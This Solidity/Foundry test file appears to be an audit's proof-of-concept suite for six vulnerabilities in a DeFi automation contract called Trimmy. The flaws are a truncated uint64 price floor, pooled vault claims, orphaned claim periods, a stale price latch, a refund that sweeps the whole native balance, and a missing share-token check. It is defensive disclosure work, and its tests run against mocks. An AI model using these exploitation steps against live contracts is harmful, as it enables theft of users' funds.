// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import {IConfidentialTrigger} from "../../src/Interfaces.sol";
import {IConfidentialTrigger} from "../../src/Interfaces.sol";
import {Trimmy} from "../../src/Trimmy.sol";
import {Quote} from "../../src/Quote.sol";
import {
    MockERC20,
    MockFtsoV2,
    MockRegistry,
    MockSwapRouter,
    MockQueuedVault
} from "../mocks/Mocks.sol";

/// @title Money-lens attack PoCs against the DEPLOYED Trimmy configuration.
/// @notice Unlike Trimmy.t.sol, which pairs a 6dp token on a 6dp feed against another 6dp token on
///         a 6dp feed (exponent 0, relative price 3e6 — always inside uint64), this file uses the
///         ACTUAL live allowlist of 0xf73a2af0…6554 on Coston2:
///           token0 FXRP   0x0b6A3645… 6 dp, XRP/USD feed, 6 dp
///           token1 WC2FLR 0xC67DCE33… 18 dp, FLR/USD feed, 8 dp
///         and the actual live feed values read on 2026-08-07.
contract AttackMoneyTest is Test {
    address internal constant REGISTRY_ADDR = 0xaD67FE66660Fb8dFE9d6b1b4240d8650e30F6019;

    bytes21 internal constant FEED_XRP =
        bytes21(uint168(0x015852502f55534400000000000000000000000000));
    bytes21 internal constant FEED_FLR =
        bytes21(uint168(0x01464c522f55534400000000000000000000000000));

    // Live chain reads, 2026-08-07, FtsoV2 0xC4e9c78EA53db782E28f28Fdf80BaF59336B304d on Coston2.
    uint256 internal constant XRP_USD_MANTISSA = 1_022_160; // 6 dp -> $1.022160
    uint256 internal constant FLR_USD_MANTISSA = 592_822; //   8 dp -> $0.00592822

    Trimmy internal trimmy;
    MockERC20 internal fxrp; // 6 dp
    MockERC20 internal wc2flr; // 18 dp
    MockFtsoV2 internal ftso;
    MockSwapRouter internal router;

    address internal account = makeAddr("personalAccount");
    address internal keeper = makeAddr("keeper");
    address internal feeSink = makeAddr("feeSink");

    uint8 internal constant TOK_FXRP = 0;
    uint8 internal constant TOK_FLR = 1;
    uint64 internal constant MAX_FEED_AGE = 120; // the deployed value

    function setUp() public {
        vm.warp(10 days);

        fxrp = new MockERC20("FTestXRP", "FXRP", 6);
        wc2flr = new MockERC20("Wrapped C2FLR", "WC2FLR", 18);

        ftso = new MockFtsoV2();
        MockRegistry reg = new MockRegistry();
        vm.etch(REGISTRY_ADDR, address(reg).code);
        MockRegistry(REGISTRY_ADDR).setFtso(address(ftso));

        _setFeeds(XRP_USD_MANTISSA, FLR_USD_MANTISSA);

        router = new MockSwapRouter();

        Trimmy.TokenCfg[] memory tokens = new Trimmy.TokenCfg[](2);
        tokens[0] = Trimmy.TokenCfg({token: address(fxrp), feedId: FEED_XRP, decimals: 6});
        tokens[1] = Trimmy.TokenCfg({token: address(wc2flr), feedId: FEED_FLR, decimals: 18});

        Trimmy.VenueCfg[] memory venues = new Trimmy.VenueCfg[](1);
        venues[0] = Trimmy.VenueCfg({
            target: address(router), kind: Trimmy.VenueKind.SWAP_ROUTER_V3, feeTier: 3000
        });

        trimmy = new Trimmy(tokens, venues, MAX_FEED_AGE, feeSink, IConfidentialTrigger(address(0)));

        fxrp.mint(account, 1_000_000e6);
        vm.prank(account);
        fxrp.approve(address(trimmy), type(uint256).max);
    }

    function _setFeeds(uint256 xrpUsd, uint256 flrUsd) internal {
        uint64 nowTs = uint64(vm.getBlockTimestamp());
        ftso.setFeed(FEED_XRP, xrpUsd, 6, nowTs);
        ftso.setFeed(FEED_FLR, flrUsd, 8, nowTs);
    }

    /// @dev The true, unclamped relative price the contract's own Quote library computes.
    function _trueRelative() internal view returns (uint256) {
        Quote.Feed memory sell =
            Quote.Feed({value: XRP_USD_MANTISSA, decimals: 6, timestamp: uint64(block.timestamp)});
        Quote.Feed memory buy =
            Quote.Feed({value: FLR_USD_MANTISSA, decimals: 8, timestamp: uint64(block.timestamp)});
        return Quote.convert(1e6, sell, 6, buy, 18);
    }

    function _sellFxrpParams() internal view returns (Trimmy.RuleParams memory p) {
        p = Trimmy.RuleParams({
            sellTokenId: TOK_FXRP,
            buyTokenId: TOK_FLR,
            verb: Trimmy.Verb.SWAP,
            venueId: 0,
            trigger: Trimmy.Trigger.SCHEDULE,
            totalSellAmount: 100e6, // 100 FXRP
            partSellAmount: 100e6,
            minOutAbsolute: 0,
            triggerValue: 3600,
            expiry: uint64(block.timestamp + 30 days),
            slippageBips: 50, // the maximum the contract allows
            protocolFeeBips: 0,
            keeperFeeFlat: 0,
            keeperFeeBudget: 0
        });
    }

    // ===================================================================================
    // M-1: uint64 latchedPrice truncates the live pair, so the FTSO floor is 9.35x too low
    // ===================================================================================

    /// Trimmy.sol:440 clamps the relative price into a uint64 before storing it as
    /// `latchedPrice`; Trimmy.sol:466-468 then derives the ONLY slippage floor from that field.
    /// For the deployed FXRP -> WC2FLR direction the true relative price is 1.724e20, which does
    /// not fit in uint64 (max 1.8447e19). The floor is therefore computed from 10.7% of the real
    /// price, and a swap that returns 12% of fair value passes the "50 bips" check.
    function test_M1_uint64ClampMakesFloorMeaningless() public {
        uint256 trueRel = _trueRelative();
        console2.log("true relative (WC2FLR wei per 1 FXRP):", trueRel);
        console2.log("uint64 max                            :", uint256(type(uint64).max));
        assertGt(trueRel, type(uint64).max, "premise: the live pair overflows uint64");

        uint256 id = _arm(_sellFxrpParams());

        // Fair proceeds for 100 FXRP at the live oracle price.
        uint256 fair = (100e6 * trueRel) / 1e6; // 1.724e22 wei == 17,242 WC2FLR

        // The venue delivers only 20 WC2FLR per FXRP — 88.4% below the oracle's own valuation.
        router.setRateWad(20e18);

        vm.prank(keeper);
        trimmy.execute(id); // MUST revert if the floor were correct. It does not.

        uint256 got = wc2flr.balanceOf(account);
        console2.log("fair proceeds  (wei WC2FLR):", fair);
        console2.log("actual proceeds(wei WC2FLR):", got);
        console2.log("user loss %                :", 100 - (got * 100) / fair);

        // The rule executed and the user was paid 88% below the oracle price with slippage set to
        // the strictest value the contract permits.
        assertGt(fair, got * 8, "user received less than 1/8 of fair value");

        // The stored latch is the clamp, not the price.
        assertEq(trimmy.ruleAt(id).latchedPrice, type(uint64).max, "latchedPrice is saturated");

        // What the floor SHOULD have been, and what it actually was.
        uint256 correctFloor = (fair * 9950) / 10_000;
        uint256 actualFloor = ((100e6 * uint256(type(uint64).max)) / 1e6 * 9950) / 10_000;
        console2.log("floor that should have applied:", correctFloor);
        console2.log("floor that actually applied   :", actualFloor);

        // THIS is the assertion that fails against current code: the enforced floor must be
        // within the user's declared 50 bips of the oracle's own fair value.
        assertGe(actualFloor, correctFloor, "M-1: enforced floor is far below the oracle floor");
    }

    /// The same defect read from the trigger side: `latchedPrice`/`price` saturate, so a
    /// PRICE_ABOVE rule on the live pair cannot distinguish a 9.35x price move.
    function test_M1b_priceTriggerCannotSeeA9xMove() public {
        Trimmy.RuleParams memory p = _sellFxrpParams();
        p.trigger = Trimmy.Trigger.PRICE_ABOVE;
        p.triggerValue = type(uint64).max; // the strictest threshold expressible at all
        uint256 id = _arm(p);

        // FLR pumps 9.34x against XRP. 1 FXRP now buys 18.46 WC2FLR instead of 172.42 — the user's
        // "only sell when FXRP is strong" rule should now be far out of the money.
        _setFeeds(XRP_USD_MANTISSA, FLR_USD_MANTISSA * 934 / 100);
        router.setRateWad(18.46e18);

        vm.prank(keeper);
        trimmy.execute(id); // fires anyway

        // The threshold is unreachable in the other direction too: the user cannot express
        // "fire above 172 WC2FLR per FXRP" at all, because 172e18 does not fit in uint64.
        assertGt(_trueRelative(), type(uint64).max, "the expressible range excludes the live price");
        assertTrue(false, "M-1b: PRICE_ABOVE fired 9.34x below the intended threshold");
    }

    /// Control: the OPPOSITE direction is fine, which is why nothing caught this.
    /// WC2FLR (18dp/8dp feed) -> FXRP (6dp/6dp feed) yields 5799, comfortably inside uint64.
    function test_M1c_reverseDirectionFits() public view {
        Quote.Feed memory sell =
            Quote.Feed({value: FLR_USD_MANTISSA, decimals: 8, timestamp: uint64(block.timestamp)});
        Quote.Feed memory buy =
            Quote.Feed({value: XRP_USD_MANTISSA, decimals: 6, timestamp: uint64(block.timestamp)});
        uint256 rel = Quote.convert(1e18, sell, 18, buy, 6);
        console2.log("WC2FLR->FXRP relative:", rel); // 5799
        assertLt(rel, type(uint64).max);
    }

    function _arm(Trimmy.RuleParams memory p) internal returns (uint256 id) {
        vm.prank(account);
        id = trimmy.arm(p);
    }
}

// =======================================================================================
// M-2: EXIT_VAULT claims are pooled per (Trimmy, period), so the first claimer takes
//      every other user's queued assets for that day.
// =======================================================================================
contract AttackVaultClaimTest is Test {
    address internal constant REGISTRY_ADDR = 0xaD67FE66660Fb8dFE9d6b1b4240d8650e30F6019;
    bytes21 internal constant FEED_XRP =
        bytes21(uint168(0x015852502f55534400000000000000000000000000));
    bytes21 internal constant FEED_USD =
        bytes21(uint168(0x015553445430000000000000000000000000000000));

    Trimmy internal exiter;
    MockERC20 internal fxrp;
    MockERC20 internal usdt;
    MockQueuedVault internal vault;
    MockFtsoV2 internal ftso;

    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");
    address internal keeper = makeAddr("keeper");
    address internal feeSink = makeAddr("feeSink");

    function setUp() public {
        vm.warp(10 days);

        fxrp = new MockERC20("FTestXRP", "FXRP", 6);
        usdt = new MockERC20("TestUSDT", "USDT", 6);
        vault = new MockQueuedVault(IERC20(address(fxrp)));

        ftso = new MockFtsoV2();
        MockRegistry reg = new MockRegistry();
        vm.etch(REGISTRY_ADDR, address(reg).code);
        MockRegistry(REGISTRY_ADDR).setFtso(address(ftso));
        ftso.setFeed(FEED_XRP, 3_000_000, 6, uint64(vm.getBlockTimestamp()));
        ftso.setFeed(FEED_USD, 1_000_000, 6, uint64(vm.getBlockTimestamp()));

        // Same shape as Trimmy.t.sol::test_exitVault_isTwoPhase: the share token is allowlisted.
        Trimmy.TokenCfg[] memory tokens = new Trimmy.TokenCfg[](2);
        tokens[0] = Trimmy.TokenCfg({token: address(vault), feedId: FEED_XRP, decimals: 6});
        tokens[1] = Trimmy.TokenCfg({token: address(usdt), feedId: FEED_USD, decimals: 6});
        Trimmy.VenueCfg[] memory venues = new Trimmy.VenueCfg[](1);
        venues[0] = Trimmy.VenueCfg({
            target: address(vault), kind: Trimmy.VenueKind.QUEUED_VAULT, feeTier: 0
        });
        exiter = new Trimmy(tokens, venues, 120, feeSink, IConfidentialTrigger(address(0)));

        _fund(alice);
        _fund(bob);
    }

    function _fund(address who) internal {
        fxrp.mint(who, 1_000e6);
        vm.startPrank(who);
        fxrp.approve(address(vault), type(uint256).max);
        vault.deposit(100e6, who);
        vault.approve(address(exiter), type(uint256).max);
        vm.stopPrank();
    }

    function _exitParams() internal view returns (Trimmy.RuleParams memory p) {
        p = Trimmy.RuleParams({
            sellTokenId: 0,
            buyTokenId: 0,
            verb: Trimmy.Verb.EXIT_VAULT,
            venueId: 0,
            trigger: Trimmy.Trigger.SCHEDULE,
            totalSellAmount: 100e6,
            partSellAmount: 100e6,
            minOutAbsolute: 0,
            triggerValue: 3600,
            expiry: uint64(block.timestamp + 30 days),
            slippageBips: 0,
            protocolFeeBips: 0,
            keeperFeeFlat: 0,
            keeperFeeBudget: 0
        });
    }

    /// Trimmy.sol:516-537 queues every rule's redemption under `pendingWithdrawAssets[Trimmy][p]`,
    /// which the vault keys by RECEIVER, not by rule. Trimmy.sol:543-566 then claims the whole
    /// bucket and hands the entire measured delta to ONE rule's account.
    function test_M2_firstClaimerStealsEveryOtherUsersQueuedAssets() public {
        vm.prank(alice);
        uint256 ra = exiter.arm(_exitParams());
        vm.prank(bob);
        uint256 rb = exiter.arm(_exitParams());

        vm.prank(keeper);
        exiter.execute(ra);
        vm.prank(keeper);
        exiter.execute(rb); // same block -> same day-index period

        Trimmy.Rule memory A = exiter.ruleAt(ra);
        Trimmy.Rule memory B = exiter.ruleAt(rb);
        assertEq(A.claimPeriod, B.claimPeriod, "premise: both filed under the same period");

        vm.warp(A.claimableAt);

        uint256 aBefore = fxrp.balanceOf(alice);
        uint256 bBefore = fxrp.balanceOf(bob);

        vm.prank(keeper);
        exiter.claim(ra);
        vm.prank(keeper);
        exiter.claim(rb);

        uint256 aGot = fxrp.balanceOf(alice) - aBefore;
        uint256 bGot = fxrp.balanceOf(bob) - bBefore;
        console2.log("alice received:", aGot);
        console2.log("bob   received:", bGot);

        assertEq(aGot, 100e6, "M-2: alice must receive exactly her own 100 FXRP");
        assertEq(bGot, 100e6, "M-2: bob must receive exactly his own 100 FXRP");
    }

    /// A single user is enough: two parts that straddle a UTC midnight land in different periods,
    /// `r.claimPeriod` is overwritten by the second, and the first period's assets become
    /// permanently unclaimable — there is no rescue function anywhere in the contract.
    function test_M3_secondQueueOrphansTheFirstPeriodsAssets() public {
        Trimmy.RuleParams memory p = _exitParams();
        p.totalSellAmount = 100e6;
        p.partSellAmount = 50e6;
        p.triggerValue = 60;

        vm.prank(alice);
        uint256 id = exiter.arm(p);

        // Part one, just before midnight (lagDuration is 300s on the mock, 0 would behave the same).
        uint256 midnight = ((block.timestamp / 1 days) + 1) * 1 days;
        vm.warp(midnight - 400);
        ftso.setFeed(FEED_XRP, 3_000_000, 6, uint64(vm.getBlockTimestamp()));
        ftso.setFeed(FEED_USD, 1_000_000, 6, uint64(vm.getBlockTimestamp()));
        vm.prank(keeper);
        exiter.execute(id);
        uint64 period1 = exiter.ruleAt(id).claimPeriod;

        // Part two, a few minutes later — a different day index.
        vm.warp(midnight + 100);
        ftso.setFeed(FEED_XRP, 3_000_000, 6, uint64(vm.getBlockTimestamp()));
        ftso.setFeed(FEED_USD, 1_000_000, 6, uint64(vm.getBlockTimestamp()));
        vm.prank(keeper);
        exiter.execute(id);
        uint64 period2 = exiter.ruleAt(id).claimPeriod;

        assertTrue(period1 != period2, "premise: the parts straddle a UTC midnight");
        assertEq(exiter.ruleAt(id).pendingShares, 100e6, "both parts are counted as pending");

        vm.warp(exiter.ruleAt(id).claimableAt);
        uint256 before = fxrp.balanceOf(alice);
        vm.prank(keeper);
        exiter.claim(id);
        uint256 got = fxrp.balanceOf(alice) - before;

        console2.log(
            "period1 still stranded in vault:",
            vault.pendingWithdrawAssets(address(exiter), period1)
        );
        console2.log("alice received:", got);

        // pendingShares was zeroed, so claim() can never be called again for period1.
        vm.expectRevert(Trimmy.NothingPending.selector);
        exiter.claim(id);

        assertEq(got, 100e6, "M-3: alice must receive both parts, not just the last period");
    }
}

// =======================================================================================
// M-4: the A12 latch is one-sided. It floors against the FIRST fire forever, so on a
//      multi-part rule every later part is fillable at the stale (lower) price.
// M-5: _refund() sweeps the contract's ENTIRE native balance to msg.sender.
// M-6: _validate never checks the EXIT_VAULT sell token against the vault's share token.
// =======================================================================================
contract AttackLatchTest is Test {
    address internal constant REGISTRY_ADDR = 0xaD67FE66660Fb8dFE9d6b1b4240d8650e30F6019;
    bytes21 internal constant FEED_XRP =
        bytes21(uint168(0x015852502f55534400000000000000000000000000));
    bytes21 internal constant FEED_USD =
        bytes21(uint168(0x015553445430000000000000000000000000000000));

    Trimmy internal trimmy;
    MockERC20 internal fxrp;
    MockERC20 internal usdt;
    MockFtsoV2 internal ftso;
    MockSwapRouter internal router;
    MockQueuedVault internal vault;

    address internal account = makeAddr("account");
    address internal keeper = makeAddr("keeper");
    address internal feeSink = makeAddr("feeSink");

    function setUp() public {
        vm.warp(10 days);
        fxrp = new MockERC20("FTestXRP", "FXRP", 6);
        usdt = new MockERC20("TestUSDT", "USDT", 6);
        ftso = new MockFtsoV2();
        MockRegistry reg = new MockRegistry();
        vm.etch(REGISTRY_ADDR, address(reg).code);
        MockRegistry(REGISTRY_ADDR).setFtso(address(ftso));
        _feeds(3_000_000);
        router = new MockSwapRouter();
        router.setRateWad(3e18);
        vault = new MockQueuedVault(IERC20(address(fxrp)));

        Trimmy.TokenCfg[] memory tokens = new Trimmy.TokenCfg[](2);
        tokens[0] = Trimmy.TokenCfg({token: address(fxrp), feedId: FEED_XRP, decimals: 6});
        tokens[1] = Trimmy.TokenCfg({token: address(usdt), feedId: FEED_USD, decimals: 6});
        Trimmy.VenueCfg[] memory venues = new Trimmy.VenueCfg[](2);
        venues[0] = Trimmy.VenueCfg({
            target: address(router), kind: Trimmy.VenueKind.SWAP_ROUTER_V3, feeTier: 3000
        });
        venues[1] = Trimmy.VenueCfg({
            target: address(vault), kind: Trimmy.VenueKind.QUEUED_VAULT, feeTier: 0
        });
        trimmy = new Trimmy(tokens, venues, 120, feeSink, IConfidentialTrigger(address(0)));

        fxrp.mint(account, 1_000_000e6);
        vm.prank(account);
        fxrp.approve(address(trimmy), type(uint256).max);
    }

    function _feeds(uint256 xrpUsd) internal {
        uint64 t = uint64(vm.getBlockTimestamp());
        ftso.setFeed(FEED_XRP, xrpUsd, 6, t);
        ftso.setFeed(FEED_USD, 1_000_000, 6, t);
    }

    function _p() internal view returns (Trimmy.RuleParams memory p) {
        p = Trimmy.RuleParams({
            sellTokenId: 0,
            buyTokenId: 1,
            verb: Trimmy.Verb.SWAP,
            venueId: 0,
            trigger: Trimmy.Trigger.SCHEDULE,
            totalSellAmount: 100e6,
            partSellAmount: 50e6,
            minOutAbsolute: 0,
            triggerValue: 3600,
            expiry: uint64(vm.getBlockTimestamp() + 30 days),
            slippageBips: 50,
            protocolFeeBips: 0,
            keeperFeeFlat: 0,
            keeperFeeBudget: 0
        });
    }

    /// M-4. Trimmy.sol:389 latches on the first fire and Trimmy.sol:466 never refreshes it.
    /// The comment at 462-465 justifies this against a FALLING market. In a RISING market the
    /// latch is a floor that is too LOW, and every later part is a standing invitation.
    function test_M4_staleLatchLetsLaterPartsFillAtTheOldPrice() public {
        vm.prank(account);
        uint256 id = trimmy.arm(_p());

        vm.prank(keeper);
        trimmy.execute(id); // part 1 at 3.00, latches 3_000_000
        assertEq(trimmy.ruleAt(id).latchedPrice, 3_000_000);

        // XRP doubles. Part 2 is worth 300 USDT; the floor still says 150.
        vm.warp(vm.getBlockTimestamp() + 3700);
        _feeds(6_000_000);

        // The venue fills at the OLD price. A correct floor rejects this; the latch accepts it.
        router.setRateWad(3e18);
        uint256 before = usdt.balanceOf(account);
        vm.prank(keeper);
        trimmy.execute(id);
        uint256 got = usdt.balanceOf(account) - before;

        console2.log("fair value of part 2 (USDT):", uint256(300e6));
        console2.log("what the user received     :", got);
        assertGe(got, (300e6 * 9950) / 10_000, "M-4: part 2 filled 50% below the live oracle price");
    }

    /// M-5. Trimmy.sol:675-681 refunds `address(this).balance`, not `msg.value - fee`.
    /// `receive()` at Trimmy.sol:687 is open, and the SwapRouter is payable, so any native the
    /// contract ever holds is swept by whoever calls `execute` next.
    function test_M5_refundSweepsWholeNativeBalance() public {
        vm.deal(address(trimmy), 5 ether); // stray native: a donation, or a router refund
        vm.prank(account);
        uint256 id = trimmy.arm(_p());

        uint256 keeperBefore = keeper.balance;
        vm.prank(keeper);
        trimmy.execute(id); // msg.value == 0; the FTSO fee is 0

        console2.log("keeper native gain:", keeper.balance - keeperBefore);
        assertEq(keeper.balance - keeperBefore, 0, "M-5: keeper swept native it never supplied");
    }

    /// M-6. Trimmy.sol:341-350: the `underlying != sellToken` assertion is guarded by
    /// `p.verb == Verb.DEPOSIT_VAULT`. For EXIT_VAULT nothing checks that the sell token is the
    /// vault's SHARE token — which is what `_doQueueRedeem` actually burns. On the live allowlist
    /// (FXRP, WC2FLR) neither token is the share token, so every EXIT_VAULT rule armable today is
    /// mis-shaped, and the XRPL arming payment that created it is irreversible.
    function test_M6_exitVaultArmsWithTheWrongSellToken() public {
        Trimmy.RuleParams memory p = _p();
        p.verb = Trimmy.Verb.EXIT_VAULT;
        p.venueId = 1; // the vault
        p.sellTokenId = 0; // FXRP — the vault's ASSET, not its share token
        p.buyTokenId = 0;
        p.partSellAmount = 100e6;

        vm.prank(account);
        uint256 id = trimmy.arm(p); // accepted, no revert

        // Someone (anyone) transfers vault shares to Trimmy — an open ERC20, no permission needed.
        fxrp.mint(address(this), 100e6);
        fxrp.approve(address(vault), type(uint256).max);
        vault.deposit(100e6, address(trimmy));

        uint256 userBefore = fxrp.balanceOf(account);
        vm.prank(keeper);
        trimmy.execute(id); // pulls 100 FXRP from the user, redeems the DONATED shares

        // The user's 100 FXRP is now sitting in Trimmy. There is no rescue function anywhere.
        console2.log("user FXRP debited   :", userBefore - fxrp.balanceOf(account));
        console2.log("FXRP stranded in Trimmy:", fxrp.balanceOf(address(trimmy)));
        assertEq(fxrp.balanceOf(address(trimmy)), 0, "M-6: user's sell tokens are stranded forever");
    }
}
